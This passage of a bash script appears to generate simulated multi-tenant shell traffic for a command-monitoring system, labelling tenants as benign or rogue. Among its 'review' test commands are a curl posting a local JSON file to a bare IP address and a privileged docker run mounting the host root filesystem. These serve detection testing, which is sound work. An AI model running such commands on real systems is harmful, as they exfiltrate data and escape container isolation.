...
benign_acme=( "git status" "git pull --rebase" "npm ci" "npm test" "cat package.json" "node scripts/build.js" "grep -r TODO src/" "ls -la dist/" "curl -s https://registry.npmjs.org/react" "git commit -am 'fix: null guard'" )
benign_initech=( "python3 etl/load.py --dry-run" "cat data/customers.csv" "pandas_report.py --month 07" "curl -s https://internal.initech.local/api/v1/health" "psql -c 'select count(*) from orders'" "jupyter nbconvert report.ipynb" )
benign_umbrella=( "kubectl get pods -A" "helm upgrade app ./chart" "terraform plan" "docker build -t app:ci ." "git log --oneline -20" "kubectl rollout status deploy/api" )

# ── flagged-but-not-clearly-malicious (review) ───────────────────────────────
review_initech=( "curl -s http://45.83.12.9/collect -d @/tmp/out.json" "sudo systemctl restart postgresql" )
review_umbrella=( "docker run --privileged -v /:/host alpine sh" "kubectl exec -it api -- /bin/sh" )
...
for w in $(seq 1 "$WAVES"); do
  echo "wave $w/$WAVES ..."
  for c in "${benign_acme[@]}";     do send acme-corp  cc-acme     "$c"; done
  for c in "${benign_initech[@]}";  do send initech    cc-initech  "$c"; done
  for c in "${benign_umbrella[@]}"; do send umbrella   cc-umbrella "$c"; done
  for c in "${review_initech[@]}";  do send initech    cc-initech  "$c"; done
  for c in "${review_umbrella[@]}"; do send umbrella   cc-umbrella "$c"; done
  for c in "${rogue[@]}";           do send globex-inc cc-rogue    "$c"; done
  [ "$w" -lt "$WAVES" ] && sleep 20
done
echo "done: 4 tenants (acme/initech/umbrella benign, globex-inc rogue), $WAVES waves"
